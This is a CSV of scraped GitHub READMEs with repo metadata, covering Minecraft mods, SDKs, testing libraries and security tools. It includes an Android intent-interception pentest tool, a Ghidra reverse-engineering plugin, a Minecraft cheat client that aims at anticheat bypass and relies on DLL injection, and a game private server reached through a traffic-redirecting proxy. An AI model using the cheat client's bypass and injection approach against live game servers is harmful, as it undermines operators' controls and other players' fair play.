repo,branch,readme,releases,issues,branches,pulls,headings,top
Alumopper/Datapack-Debugger,master,"# Datapack Breakpoint

English | [简体中文](README_zh.md)

## Introduce

This is a fabric mod for Minecraft 1.21, which allows you to set breakpoints in the game and ""freeze"" the game when 
the breakpoint is reached.

## Usage

* Set a breakpoint

In datapack, you can insert `#breakpoint` into .mcfunction file to set a breakpoint. For example:

```mcfunction
#test:test

say 1
say 2
#breakpoint
say 3
say 4
```

In this case, after the game executes `say 2`, the game will be ""frozen"" because it meets the breakpoint. 

When the game is ""frozen"", you can still move around, do whatever you want, just like execute the command `tick freeze`.
So you can check the game state, or do some debugging.

* Step

When the game is ""frozen"", you can use the command `/breakpoint step` to execute the next command. In above example, 
after the game meets the breakpoint, you can use `/breakpoint step` to execute `say 3`, and then use `/breakpoint step`
to execute `say 4`. When all commands are executed, the game will be unfrozen and continue running.

* Continue

When the game is ""frozen"", you can use the command `/breakpoint move` to unfreeze the game and continue running.

* Get Macro Arguments

By using `/breakpoint get <key>`, you can get the value of the macro argument if the game is executing a macro function.
For example:

```mcfunction
#test:test_macro

say start
#breakpoint
$say $(msg)
say end
```

After executing `function test:test_macro {""msg"":""test""}`, we passed the value `test` to the macro argument `msg` and 
then the game will pause before `$say $(msg)`. At this time, you can use `/breakpoint get msg` to get the value `test`.

* Get Function Stack

By using `/breakpoint stack`, you can get the function stack of the current game. For example, if we have following two
functions:

```mcfunction
#test:test1

say 1
function test:test2
say 2

#test: test2
say A
#breakpoint
say B
```

When the game pauses at the breakpoint, you can use `/breakpoint stack` and the function stack will be printed in the
chat screen:

```
test:test2
test:test

```

* Run command in current context

By using `/breakpoint run <command>`, you can run any command in the current context, just like `execute ... run ...`.",5,1,1,4.0,"['datapack', 'breakpoint', 'introduce', 'usage']","['datapack', 'breakpoint', 'introduce', 'usage']"
coinbase-samples/advanced-sdk-java,main,"# Coinbase Advanced Trade Java SDK README

## Overview

The *Advanced Java SDK* is a sample library that demonstrates the structure of a [Coinbase Advanced Trade](https://advanced.coinbase.com/) driver for
the [REST APIs](https://docs.cdp.coinbase.com/advanced-trade/reference).

Coinbase Advanced Trade offers a comprehensive API for traders, providing access to real-time market data, order management, and execution. Elevate your trading strategies and develop sophisticated solutions using our powerful tools and features.

## License

The *Advanced Java SDK* sample library is free and open source and released under the [Apache License, Version 2.0](LICENSE).

The application and code are only available for demonstration purposes.

## Usage

To use the *Advanced Java SDK*, initialize the Credentials class and create a new client. The Credentials struct is JSON
enabled. See an example of this inside of the [main.java.com.coinbase.examples package](./src/main/java/com/coinbase/examples/Main.java). Ensure that Advanced API credentials are stored in a secure manner.

The JSON format expected for `Advanced_CREDENTIALS` is:

```
{
  ""apiKeyName"": """",
  ""privateKey"": """",
}
```

Coinbase Advanced API credentials can be created in the Advanced web console under API.

An example of instantiating the credentials and using the PortfoliosService is shown below:

```java
public class Main {
    public static void main(String[] args) {
        String credsStringBlob = System.getenv(""ADVANCED_TRADE_CREDENTIALS"");
        ObjectMapper mapper = new ObjectMapper();

        try {
            CoinbaseAdvancedCredentials credentials = new CoinbaseAdvancedCredentials(credsStringBlob);
            CoinbaseAdvancedClient client = new CoinbaseAdvancedClient(credentials);

            PortfoliosService portfoliosService = AdvancedServiceFactory.createPortfoliosService(client);
            GetPortfolioByIdResponse portfolioResponse = portfoliosService.getPortfolioById(
                    new GetPortfolioByIdRequest.Builder()
                            .portfolioId(portfolioId)
                            .build());

            System.out.println(mapper.writeValueAsString(portfolioResponse));
        } catch (Exception e) {
            e.printStackTrace(e);
        }
    }
}
```

To see a full working example, see the [`Main`](src/main/java/com/coinbase/examples/Main.java) class under the com.coinbase.examples package.

**Warning** This does place a very small trade for a small amount of ADA. Please ensure that you have the necessary funds in your account before running this code.

## Binaries

Binaries and dependency information for Maven, Gradle, Ivy and others can be found at the [Maven Central Repository](https://central.sonatype.com/search?q=g%3Acom.coinbase.advanced+a%3Acoinbase-advanced-sdk-java&smo=true)

Maven example:

```xml
<dependency>
    <groupId>com.coinbase.advanced</groupId>
    <artifactId>coinbase-advanced-sdk-java</artifactId>
    <version>x.y.z</version>
</dependency>
```

## Build

To build the sample library, ensure that Java Development Kit (JDK) is installed and then run:

```bash
mvn clean install
```
",1,0,1,2.0,"['coinbase', 'advanced', 'trade', 'java', 'sdk', 'readme', 'overview', 'license', 'usage', 'binary', 'build']","['coinbase', 'advanced', 'trade', 'java', 'sdk']"
Ch0pin/stheno,main,"<p align=""center"">
  <img src=""https://github.com/Ch0pin/stheno/assets/4659186/0c82c3da-1a89-43b5-9b8f-4c161dfc5c5c"" alt=""Stheno"">
</p>

# Stheno

## Overview

**Stheno (Σθεννώ)** is a powerful tool designed for analyzing and manipulating intents in Android applications. Named after the sister of Medusa, Stheno is indeed a sub project of [Medusa](https://github.com/Ch0pin/medusa) that brings formidable capabilities akin to Burp Suite but tailored specifically for intents. This tool is essential for Android penetration testers, developers, and security enthusiasts who seek to understand and secure their applications against intent-based vulnerabilities.

## Features

- **Intent Interception**: Capture and inspect intents sent and received by Android applications. 
- **Intent Modification (TODO)**: Modify intercepted intents to test how applications handle unexpected or malformed data.
- **Intent Replay (TODO)**: Resend captured intents to test the stability and security of applications.
- **Logging and Reporting (TODO)**: Detailed logging of all activities and comprehensive reporting to aid in vulnerability assessment.

  
<p align=""center"">
  <img src=""https://github.com/Ch0pin/stheno/assets/4659186/fd49c39e-865b-4dc3-b2d1-59a0f4594028"" alt=""monitor"">
</p>

## Installation 

Stheno can be used either as a standalone tool or in conjunction with [Medusa](https://github.com/Ch0pin/medusa).

### Standalone installation:

1. **Install the Requirements:**
   ```sh
   pip install -r requirements.txt
   ```

2. **Build the Project:**
   Navigate to the `Intent-monitor` folder and run:
   ```sh
   ./gradlew build
   ```
### Using with Medusa:

If you are using Stheno with Medusa, only step 2 is necessary:

1. **Build the Project:**
   Navigate to the `Intent-monitor` folder and run:
   ```sh
   ./gradlew build
   ```
---

## Basic Usage:

1. Run the python script defining the target app that you want to monitor (e.g. `python3 stheno.py -t com.foo.bar`)
2. Run the monitor and got to menu->start to start monitoring the intents


## Contributing

We welcome contributions from the community! To contribute:

1. Fork the repository.
2. Create a new branch for your feature or bugfix.
3. Implement your changes and test thoroughly.
4. Submit a pull request with a detailed description of your changes.
",0,1,1,0.0,"['stheno', 'overview', 'feature', 'installation', 'standalone', 'installation', 'use', 'medusa', 'basic', 'usage', 'contribute']","['installation', 'stheno', 'overview', 'feature', 'standalone']"
scordio/jimfs-junit-jupiter,main,"# Jimfs JUnit Jupiter [![Maven Central](https://img.shields.io/maven-central/v/io.github.scordio/jimfs-junit-jupiter?label=Maven%20Central)](https://mvnrepository.com/artifact/io.github.scordio/jimfs-junit-jupiter) [![javadoc](https://javadoc.io/badge2/io.github.scordio/jimfs-junit-jupiter/javadoc.svg)](https://javadoc.io/doc/io.github.scordio/jimfs-junit-jupiter)

[![CI](https://github.com/scordio/jimfs-junit-jupiter/actions/workflows/main.yml/badge.svg?branch=main)](https://github.com/scordio/jimfs-junit-jupiter/actions/workflows/main.yml?query=branch%3Amain)
[![Cross-Version](https://github.com/scordio/jimfs-junit-jupiter/actions/workflows/cross-version.yml/badge.svg?branch=main)](https://github.com/scordio/jimfs-junit-jupiter/actions/workflows/cross-version.yml?query=branch%3Amain)

This project provides a [JUnit Jupiter][] extension for in-memory
[`@TempDir`](https://junit.org/junit5/docs/current/api/org.junit.jupiter.api/org/junit/jupiter/api/io/TempDir.html)
directories via the [Jimfs][] file system.

## Motivation

Today, it is already possible to use Jimfs and JUnit Jupiter together to create in-memory temporary directories for
testing.
However, it requires Jimfs in-memory file system handling hooked into JUnit Jupiter test lifecycle callbacks,
a boilerplate that users must implement on their own.

Starting from [version 5.10](https://junit.org/junit5/docs/5.10.0/release-notes/index.html#release-notes),
JUnit Jupiter offers a
[`TempDirFactory` SPI](https://junit.org/junit5/docs/5.10.0/user-guide/#writing-tests-built-in-extensions-TempDirectory)
for customizing how temporary directories are created via the `@TempDir` annotation.
The SPI allows libraries like Jimfs to provide their implementation.

First-party support was requested in [google/jimfs#258](https://github.com/google/jimfs/issues/258).
However, Google has not yet started using JUnit Jupiter, and such first-party support may only be provided when
Google does so.

Because of that, this extension was created to aid all the users who would like a smooth integration between Jimfs
and JUnit Jupiter.
This project will likely be discontinued if Google ever offers first-party support for this integration.

## Compatibility

Jimfs JUnit Jupiter is based on JUnit Jupiter 5, thus requiring at least Java 8.

Compatibility is guaranteed only with the JUnit Jupiter versions from 5.10 to the latest.

## Getting Started

### Maven

```xml
<dependency>
  <groupId>io.github.scordio</groupId>
  <artifactId>jimfs-junit-jupiter</artifactId>
  <version>${jimfs-junit-jupiter.version}</version>
  <scope>test</scope>
</dependency>
```

### Gradle

```kotlin
testImplementation(""io.github.scordio:jimfs-junit-jupiter:${jimfsJunitJupiterVersion}"")
```

### JimfsTempDirFactory

The simplest usage is to set the
[`factory`](https://junit.org/junit5/docs/current/api/org.junit.jupiter.api/org/junit/jupiter/api/io/TempDir.html#factory())
attribute of `@TempDir` to `JimfsTempDirFactory`:

```java
@Test
void test(@TempDir(factory = JimfsTempDirFactory.class) Path tempDir) {
  assertThat(tempDir.getFileSystem().provider().getScheme()).isEqualTo(""jimfs"");
}
```

`tempDir` is resolved into an in-memory temporary directory based on Jimfs, appropriately configured for the current
platform.

### @JimfsTempDir

`@JimfsTempDir`, a `@TempDir`
[composed annotation](https://junit.org/junit5/docs/current/user-guide/#writing-tests-meta-annotations),
can be used as a drop-in replacement for `@TempDir(factory = JimfsTempDirFactory.class)`:

```java
@Test
void test(@JimfsTempDir Path tempDir) {
  assertThat(tempDir.getFileSystem().provider().getScheme()).isEqualTo(""jimfs"");
}
```

The default behavior of the annotation is equivalent to using `JimfsTempDirFactory` directly:
`tempDir` is resolved into an in-memory temporary directory based on Jimfs, appropriately configured for the current
platform.

For better control over the underlying in-memory file system, `@JimfsTempDir` offers an optional `value` attribute
that can be set to the desired configuration, one of:
* `DEFAULT`: based on the corresponding [configuration parameter](#default-jimfs-configuration) (default)
* `FOR_CURRENT_PLATFORM`: appropriate to the current platform
* `OS_X`: for a Mac OS X-like file system
* `UNIX`: for a UNIX-like file system
* `WINDOWS`: for a Windows-like file system

For example, the following defines a Windows-like temporary directory regardless of the platform the test
is running on:

```java
@Test
void test(@JimfsTempDir(WINDOWS) Path tempDir) {
  assertThat(tempDir.getFileSystem().getSeparator()).isEqualTo(""\\"");
}
```

### Configuration Parameters

Jimfs JUnit Jupiter supports JUnit
[configuration parameters](https://junit.org/junit5/docs/current/user-guide/#running-tests-config-params).

#### Default `@TempDir` Factory

The `junit.jupiter.tempdir.factory.default` configuration parameter sets the default factory to use, expecting its
fully qualified class name.

For example, the following configures `JimfsTempDirFactory`:

```properties
junit.jupiter.tempdir.factory.default=io.github.scordio.jimfs.junit.jupiter.JimfsTempDirFactory
```

The factory will be used for all `@TempDir` annotations unless the `factory` attribute of the annotation
specifies a different type.

#### Default Jimfs Configuration

The `jimfs.junit.jupiter.tempdir.configuration.default` configuration parameter sets the default Jimfs configuration
to use, expecting one of the following (case-insensitive):
* `FOR_CURRENT_PLATFORM`: appropriate to the current platform (default)
* `OS_X`: for a Mac OS X-like file system
* `UNIX`: for a UNIX-like file system
* `WINDOWS`: for a Windows-like file system

For example, the following defines a Windows-like temporary directory regardless of the platform the test
is running on:

```properties
jimfs.junit.jupiter.tempdir.configuration.default=windows
```

All Jimfs-based temporary directories will be configured accordingly unless `@JimfsTempDir` is used and
its `value` attribute is set.

### Limitations

Jimfs JUnit Jupiter only supports annotated fields or parameters of type `Path`, as Jimfs is a non-default file
system and `File` instances can only be associated with the default file system.

## Improvements

Compared to the configuration options that Jimfs provides, Jimfs JUnit Jupiter exposes a much smaller surface to keep
its usage simple.

In case something is missing for your use case, please [raise an issue](../../issues/new)!

## License

Jimfs JUnit Jupiter is released under version 2.0 of the [Apache License][].

[Apache License]: https://www.apache.org/licenses/LICENSE-2.0
[Jimfs]: https://github.com/google/jimfs
[JUnit Jupiter]: https://github.com/junit-team/junit5
",2,0,2,0.0,"['jimfs', 'junit', 'jupiter', 'maven', 'central', 'http', 'https', 'javadoc', 'http', 'https', 'motivation', 'compatibility', 'get', 'start', 'maven', 'gradle', 'jimfstempdirfactory', 'jimfstempdir', 'configuration', 'parameter', 'default', 'tempdir', 'factory', 'default', 'jimfs', 'configuration', 'limitation', 'improvement', 'license']","['jimfs', 'maven', 'http', 'https', 'configuration']"
Patbox/mrpack4server,master,"# mrpack4server
mrpack4server is a ""server launcher"" that allows you to easily load and run any modpack from Modrinth
(or just using `.mrpack` format) as a Minecraft Server. This tool doesn't require any additional arguments
and can work as any other server jar (like vanilla provided one).

## Features:
- For any users, usable standalone, for setup of any modpack by defining a single file.
- For modpack makers, allowing quick server setup by having to just download and run a single file.
- Automatically downloads required mrpack files and any mods / external assets defined by modpack.
- Automatically downloads and starts the server/modloader files, without requiring renaming of jars, supporting Fabric Loader, 
Quilt Loader, Forge and NeoForge.
If used with modpack for other unsupported platforms, it will still install everything, but won't be able to launch.

## Usage:
The file is run just like any other Minecraft server (`java -jar mrpack4server.jar`) and will use / pass
through any arguments given to it. When used on its own, it looks in 3 places for modpack definition
with provided order:
- `modpack-info.json` within jar itself, useful for modpack makers. See below for definition,
- `modpack-info.json` within server's root directory, for users to simple setup,
- `local.mrpack` within server's root directory, making it directly use provided mrpack file instead of 
pulling it from Modrinth.

Default/main jar only supports Java 21 (`mrpack4server-X.Y.Z.jar`). If you want to run it on older Java version you can use:
- `mrpack4server-X.Y.Z-jvm8.jar` for Java 8 and above,
- `mrpack4server-X.Y.Z-jvm16.jar` for Java 16 and above,
- `mrpack4server-X.Y.Z-jvm17.jar` for Java 17 and above.

_These versions however don't override requirements of Minecraft/Loader itself. 
For example, you still need Java to use Java 17 or above to run Minecraft 1.20.1 and Java 8 (but not newer!) to run Forge 1.16.5.

You can create bundled variant by hand or by running `java -cp mrpack4server.jar eu.pb4.mrpackserver.Create`.
By default, without any arguments, it will copy currently provided `modpack-info.json` file, but you can also set it with arguments (`--arg value`),
where it mirrors all arguments from `modpack-info.json` (aka `--project_id my_modpack --version_id 1.2.3` will create jar with these defined).
Additionally, you can use the `--out` argument to set output file path, by default being set to `--out server.jar`.

### `modpack-info.json` format:_
`modpack-info.json` is a regular json file without support for comments. Ones provided below are purely
to make easier to describe things.
```json5
{
  // (Optional) Display name, used to display as information while starting / download files.
  ""display_name"": ""My Modpack"",
  // (Optional) Display version, used to display as information while starting / download files.
  ""display_version"": ""1.0.0 for 1.21.1"",
  // Project id used on Modrinth and locally, identifying modpack as unique. Can use slug or ID
  ""project_id"": ""my_modpack_by_patbox"",
  // Version id used on Modrinth and locally, identifying used version. Can be a version number, version id or prefixed version type.
  // As version type, you can set it to "";;release"", "";;beta"" or "";;alpha"", making it download latest version with highest
  // version number! For most use cases, I would recommend not using this functionality, unless you are 100% modpack's version is consistent
  // and non-hard breaking. For stability, you should use version numbers directly.
  ""version_id"": ""1.0.0"",
  // (Optional) Overrides url used to download the modpack, can download it from anywhere. 
  ""url"": ""https://files.pb4.eu/modpacks/my_modpack.mrpack"",
  // (Optional) Size of the file downloaded from ""url"", in bytes. It's not required even with ""url"" used.
  ""size"": 1000,
  // (Optional) Value of sha512 hash for file downloaded from ""url"", used for validation. It's not required even with ""url"" used.
  ""sha512"": 1000,
  // (Optional) Additional list of whitelisted domains, only useful for modpacks hosted outside Modrinth.
  ""whitelisted_domains"": [
    ""files.pb4.eu"" // Note it's just a domain, no protocol/ports/paths.
  ]
}
```

Examples:
- Installing Adrenaserver version 1.7.0+1.21.1.fabric.
```json
{
  ""project_id"": ""adrenaserver"",
  ""version_id"": ""1.7.0+1.21.1.fabric""
}
```
- Installing Cobblemon Official Modpack v1.5.2 (using id's copied from website).
```json
{
  ""project_id"": ""5FFgwNNP"",
  ""version_id"": ""bpaivauC""
}
```
",3,0,1,0.0,"['feature', 'usage', 'format']","['feature', 'usage', 'format']"
diommsantos/QtREAnalyzer,master,"# QtREAnalyzer

QtREAnalyzer is a Ghidra Analyzer designed to reverse-engineer binaries that utilize the Qt framework. Its primary function is to recover Qt-specific object and method information, providing valuable insights into binary structures.

# Features

- Works on binaries without debug symbols.
- Identifies and labels staticMetaObject objects created by  the Qt moc.
- Identifies and labels qt_meta_stringdata objects created by the Qt moc.
- Identifies and labels qt_meta_data objects created by the Qt moc.
- Identifies and labels qt_static_metacall functions created by the Qt moc.
- Annotates with comments the previously identified qt_static_metacall functions with the methods and propertie signatures recovered from the Qt meta data.
- Identifies and applies method signatures, i.e. Qt methods (signals and slots) get their original name, parameter types and sometimes parameter names depending on the available metadata.
- Identifies and applies propertie names and types to the base Qt class, i.e. Qt properties get their original name and sometimes full types depending on the available metadata, and are created in the class data type they belong to.   


# Installation

This analyzer is tied to the Ghidra version it is being installed on. Currently is necessary to build it;
built extensions will be provided in the future for the latest Ghidra versions. 

## Build the Ghidra extension

1. Install [gradle](https://docs.gradle.org/current/userguide/installation.html#ex-installing-manually)
2. Navigate to the `QtREAnalyzer\QtREAnalyzer` folder

```bash
cd QtREAnalyzer\QtREAnalyzer
```
 
3. Build the plugin for your Ghidra installation (replace `$GHIDRA_DIR` with your installation directory).
For example, if you have the following Ghidra installation path `C:\ghidra_11.0.3_PUBLIC` you would run 
``gradle -PGHIDRA_INSTALL_DIR=C:\ghidra_11.0.3_PUBLIC``. 

```bash
gradle -PGHIDRA_INSTALL_DIR=$GHIDRA_DIR
```

## Install the Analyzer

1. From Ghidra projects manager: ``File`` -> ``Install Extensions...``, click on the
   `+` sign and select the `QtREAnalyzer\QtREAnalyzer\dist\ghidra_*_QtREAnalyzer.zip` and click OK.
2. Restart Ghidra as requested

## Troubleshooting
To verify QtREAnalyzer is correctly installed, you can open CodeBrowser and select
``Analysis`` -> ``Auto Analyze ... A`` and check that the `QtReAnalyzer` option
exists.

# Usage
![QtREAnalyzer Usage](/docs/QtREAnalyzer_usage.gif)

# TODO
- [x] Automatically apply function signatures recovered from Qt metadata, see [1](https://www.usenix.org/conference/usenixsecurity23/presentation/wen).
- [x] Automatically apply properties names and types from Qt metadata, see [1](https://www.usenix.org/conference/usenixsecurity23/presentation/wen).
- [ ] Recover connections between signals and slots.
- [ ] Identify and recover more Qt classes and methods.

# Limitations

Currently QtREAnalyzer only works with x32 or x64 binaries that have RTTI (i.e compiled with the MSVC compiler). This is so since QtREAnalyzer uses RTTI to find if classes inherit from QObject. This said if one wants to extend this analyzer to work with binaries without RTTI all that is necessary to do is modify the ``RttiClass.java`` file appropriately.

In very rare cases an incorrect signature will be applied to a function or a property will be added to a data type in the incorrect address. This is almost impossible to fix since the way QtREAnalyzer maps Qt signals, slots and propertie signatures to the corresponding function address/propertie offset is heuristic based. This shouldn't be a major limitation, in a file with over 10 000 Qt signals and slots checking manually a substantial sample I only found a handful of erroneously labeled symbols.

# Acknowledgments

QtREAnalyzer would have not been possible without the following amazing resources:

- The [article](https://www.usenix.org/conference/usenixsecurity23/presentation/wen) ""Egg Hunt in Tesla Infotainment: A First Look at Reverse Engineering of Qt Binaries"" by Wen, Haohuang and Lin, Zhiqiang and its [github repository](https://github.com/OSUSecLab/QtRE)
- https://ktln2.org/reversing-c%2B%2B-qt-applications-using-ghidra/
- https://woboq.com/blog/how-qt-signals-slots-work.html
- https://www.codeproject.com/articles/31330/qt-internals-reversing
",0,0,1,0.0,"['qtreanalyzer', 'feature', 'installation', 'build', 'ghidra', 'extension', 'install', 'analyzer', 'troubleshoot', 'usage', 'todo', 'limitation', 'acknowledgment']","['qtreanalyzer', 'feature', 'installation', 'build', 'ghidra']"
hexaredecimal/BlazingWebX,main,"```
 ██████╗██╗     █████╗████████████╗   ██╗██████╗██╗    ███████████████╗██╗  ██╗
  ██╔══████║    ██╔══██╚══███╔██████╗  ████╔════╝██║    ████╔════██╔══██╚██╗██╔╝
  ██████╔██║    ███████║ ███╔╝████╔██╗ ████║  █████║ █╗ ███████╗ ██████╔╝╚███╔╝
  ██╔══████║    ██╔══██║███╔╝ ████║╚██╗████║   ████║███╗████╔══╝ ██╔══██╗██╔██╗
  ██████╔█████████║  █████████████║ ╚████╚██████╔╚███╔███╔█████████████╔██╔╝ ██╗
  ╚═════╝╚══════╚═╝  ╚═╚══════╚═╚═╝  ╚═══╝╚═════╝ ╚══╝╚══╝╚══════╚═════╝╚═╝  ╚═╝
                                        
                https://github.com/hexaredecimal/BlazingWebX
                        https://blazingwebx.onrender.com
```

## About
> - BlazingWebx is a Java library that aims to allows you to build single page web applications (SPAs) 100% in Java, without writing html and JavaScript directly. This goal is achieved through the use of Java classes which are combined together to create an elegant user experience leveraging HTMX for client and server communication while keeping your projects minimal.
> 
> - BlazingWebx also aims to simplify server side programming and how the client and server pass data to each other. 

## Features
- [X] Web Server API
- [X] Web UI API (Implements All HTML5 elements)
- [X] Builtin HTMX API
- [X] Static content Server
- [X] Support for most used HTTP methods
- [X] Simple Map to Json implementation
- [X] Simple Wrapper for Java hashing API
- [X] Https request api 

## Example
>> You basically create 2 classes. Your program class containing your java entry point. This class registers your Server class.

`Program.java`
```java
package example;

import blazing.Blazing;

public class Program {
    public static void main() {
        Blazing.createServer(HelloWorldServer.class);
    }
}
```
Then follows your server class. The library uses java annotations to find methods used for route paths and for setting up the server.

`HelloWorldServer.java`
```java
package example;

import blazing.Route;
import blazing.WebServer;
import blazing.JediResponse;
import webx.*; 

@WebServer(""6900"")
@Static(""/images"")
public class HelloWorldServer {
    
    @Initializer
    public static void init() {
      // NOTE: Space for loading/connecting server resources such as a database. 
    }

    @Destructor
    public static void deinit() {
      // NOTE: Close the db connections
    }
    
    @Get(""/"")
    public static void home(BlazingResponse reponse) {
        var page = new Html()
            .addChild(
                new Button(""Click Me"")
                    .hxPost(""/hello"")
                    .hxSwap(""outerHTML"")
            );

        response.sendUiResponse(page);
    }

    @Post(""/hello"")
    public static void hello(BlazingResponse response) {
        response.sendUiResponse(new P(""Hello, world)); // Send a <p> Hello, world </p>
    } 
}
```
Run your program and visit https://localhost:6900 or whatever port you chose. 
You should have an button with the text `Click me` and if you trigger the click event the text `Hello, World` should replace 
the button. 

## Components
You can extend the builtin library elements to create advanced components. Here is an example of a simple digital clock component. 

`ClockComponent.java`
```java
package clockserver;

import webx.Br;
import webx.Div;
import webx.GenZElement;
import webx.H1;
import webx.Html;
import webx.P;
import java.util.Calendar;

public class ClockComponent extends WebXElement {
	private int hour;
	private int minute;
	private int second;
	private String amPm;

	@Override
	public String render() {
		hour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY);
		minute = Calendar.getInstance().get(Calendar.MINUTE);
		second = Calendar.getInstance().get(Calendar.SECOND);

		var _hour = hour < 10 ? ""0"" + hour : String.valueOf(hour);
		var _minute = minute < 10 ? ""0"" + minute : String.valueOf(minute);
		var _second = second < 10 ? ""0"" + second : String.valueOf(second);

		if (hour >= 0 && hour < 12) {
			amPm = ""AM"";
		} else {
			amPm = ""PM"";
		}

		return new Div()
			.addChildren(
				new P(_hour)
					.hxTrigger(""every 1s"")
					.hxGet(""/hour""),
				new P("":""),
				new P(_minute)
					.hxTrigger(""every 1s"")
					.hxGet(""/minute""),
				new P("":""),
				new P(_second)
					.hxTrigger(""every 1s"")
					.hxGet(""/second""),
				new P(amPm)
					.hxTrigger(""every 1s"")
					.hxGet(""/ampm"")
			)
			.className(""flex flex-row text-lx"")
			.render();
	}
}
```
You can then use this component normally like any other element. 

```java
...
new Div()
    .addChild(
        new ClockComponent()
    ); 
...

@Route(""/hour"")
public static void hour(BlazingRespose reponse) {
    int hour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY);
    response.sendResponse(String.format(""%d"", hour)); // 
}

```
This allows you to create complex components that abstract away their implementation, your server only has to respond to the requests send by the components. 
This results in a simple project structure, one with zero configuration outside of adding BlazingWebx to your build system as a dependency.  

## Why
- Remove the complexity associated with creating web applications.
- Remove templates by having the UI written as classes that represent components. Through inheritance new components can be created.
- Minimize the bridge between the backend and the frontend.

## Requirements
- Java 21 or greater
- Your favourite IDE/TextEditor


## Download
- [latest](https://github.com/hexaredecimal/BlazingWebX/releases)
- [documentation](https://blazingwebx.onrender.com/javadoc/index.html)


## Star history
[![Star History Chart](https://api.star-history.com/svg?repos=hexaredecimal/BlazingWebX&type=Date)](https://star-history.com/#hexaredecimal/BlazingWebX&Date)

## Reference
- [htmx](https://htmx.org/)
- [awesomecss](https://github.com/troxler/awesome-css-frameworks?tab=readme-ov-file)

",4,3,1,0.0,"['about', 'feature', 'example', 'component', 'why', 'requirement', 'download', 'star', 'history', 'reference']","['about', 'feature', 'example', 'component', 'why']"
yapeteam/OpenYolBi,master,"<!--suppress HtmlDeprecatedAttribute -->
<p align=""center"">
  <img src=""https://avatars.githubusercontent.com/u/159465859?s=64&v=4"" alt=""YolBi Lite"" img>
</p>

为支持Minecraft开源社区 ~~(打死妖猫的圈钱梦想)~~ ，我决定开放YolBi Lite Legacy分支

为防止二次特征，loader模块不予公开

此仓库将长期维护，欢迎各位加入开发

# YolBi Lite Legacy

***Powered by Yape Development Team***

使用YolBi Lite Legacy的源代码，你必须遵守位于仓库根目录下的`YOLBI_LICENSE.md`

# Join Us

QQ Group: 699481681

## TODO List

- [ ] 1.18.1 bypass for `布吉岛`
- [ ] 更加美丽的视觉
- [ ] 注入器重构
- [ ] 能打HVH😡
- [ ] 沟槽的自动构建(为什么你的builder要写在src里面)

## Development 如何构建

查看 `论如何构建OpenYolbi项目.pptx` 或 `论如何构建OpenYolbi项目.pdf`

### Debug Build

Run `DEBUG BUILD`

### Release Build

Run `RELEASE BUILD`

### Build

1. Open this project

2. Run `DEBUG BUILD` or `RELEASE BUILD`

3. Your jar will appear in `./build`

- Cache Dir is `<userhome>/.yolbi`

## Custom

For custom build, please edit `YBuild.xml`

# Dependencies

[Reflective DLL injection](https://github.com/stephenfewer/ReflectiveDLLInjection)

[FlatLaf](https://github.com/JFormDesigner/FlatLaf)

[ASM](https://gitlab.ow2.org/asm/asm)

<hr>
",9,0,1,0.0,"['yolbi', 'lite', 'legacy', 'join', 'u', 'todo', 'list', 'development', 'debug', 'build', 'release', 'build', 'build', 'custom', 'dependency']","['build', 'yolbi', 'lite', 'legacy', 'join']"
Tutorials-By-Kaupenjoe/Fabric-Tutorial-1.21.X,main,"<a href=""https://www.youtube.com/playlist?list=PLKGarocXCE1H_HxOYihQMq0mlpqiUJj4L"" target=""_blank"">
<p align=""center"">
<img src=""https://kaupenjoe.net/files/General/Minecraft/Modding/Tutorials/fabric-tutorial-image-1.png"" alt=""Logo"" width=""1000""/> 
</p></a>

# Fabric Modding Tutorials For Minecraft 1.21.X 
This is the GitHub Repository for Kaupenjoe's Fabric Modding Tutorials For Minecraft 1.21.X

The Individual Tutorials are seperated into Branches for ease of access. 

Watch the Tutorials here: <a href=""https://www.youtube.com/playlist?list=PLKGarocXCE1H_HxOYihQMq0mlpqiUJj4L"" target=""_blank"">YouTube Playlist</a>
",0,1,21,0.0,"['fabric', 'modding', 'tutorial', 'for', 'minecraft']","['fabric', 'modding', 'tutorial', 'for', 'minecraft']"
Kei-Luna/LunaGC_5.0.0,main,"# LunaGC-5.0.0

[简中](docs/README_zh-CN.md)

My Discord https://discord.gg/8vSyTHVphj

Please contribute actively to this repository

# Setup Guide

This guide is very minimal and contains steps to just get your server and client up and running.
However, if you need a more detailed guide and help with the server please refer to GrassCutter's official repository and discord server.


## You'll need a proxy to connect to the server.
- This tutorial uses fiddler, check this [video tutorial](https://tutorials.freespyware.store/api/public/dl/viOvXvPH) to set it up if you don't know how.
- The script can be found in the docs folder, or by [this link](https://github.com/Kei-Luna/LunaGC_5.0.0/blob/main/docs/fiddlerscript.txt).

## Read the handbook (found at the end of the file)
## Some stuff mentioned here (such as wishing etc.) will not work.

## Main Requirements

- Get [Java 17](https://www.oracle.com/java/technologies/javase/jdk17-archive-downloads.html)
- Get [MongoDB Community Server](https://www.mongodb.com/try/download/community)
- Get [NodeJS](https://nodejs.org/dist/v20.15.0/node-v20.15.0-x64.msi)
- Get game version REL5.0.0 (If you don't have a 5.0.0 client, you can find it here along with the audio files) :


| Download link | Package size | Decompressed package size | MD5 checksum |
| :---: | :---: | :---: | :---: |
| [GenshinImpact_5.0.0.zip.001](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20240816185649_LtymMnnIZVQfbLZ2/GenshinImpact_5.0.0.zip.001) | 10.0 GB | 20.0 GB | 1ebf5dbcbe43bebcda7a57a8d789092e |
| [GenshinImpact_5.0.0.zip.002](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20240816185649_LtymMnnIZVQfbLZ2/GenshinImpact_5.0.0.zip.002) | 10.0 GB | 20.0 GB | 57a67026c45d57c28e5b52e24e84cc04 |
| [GenshinImpact_5.0.0.zip.003](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20240816185649_LtymMnnIZVQfbLZ2/GenshinImpact_5.0.0.zip.003) | 10.0 GB | 20.0 GB | 5e66ff28eaf6ba89e49f153c0f077d34 |
| [GenshinImpact_5.0.0.zip.004](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20240816185649_LtymMnnIZVQfbLZ2/GenshinImpact_5.0.0.zip.004) | 10.0 GB | 20.0 GB | 39f014a760e27f77abed1989739c74c6 |
| [GenshinImpact_5.0.0.zip.005](https://autopatchhk.yuanshen.com/client_app/download/pc_zip/20240816185649_LtymMnnIZVQfbLZ2/GenshinImpact_5.0.0.zip.005) | 10.0 GB | 20.0 GB | 15f9405a199afba833f18fce288b9c7f |
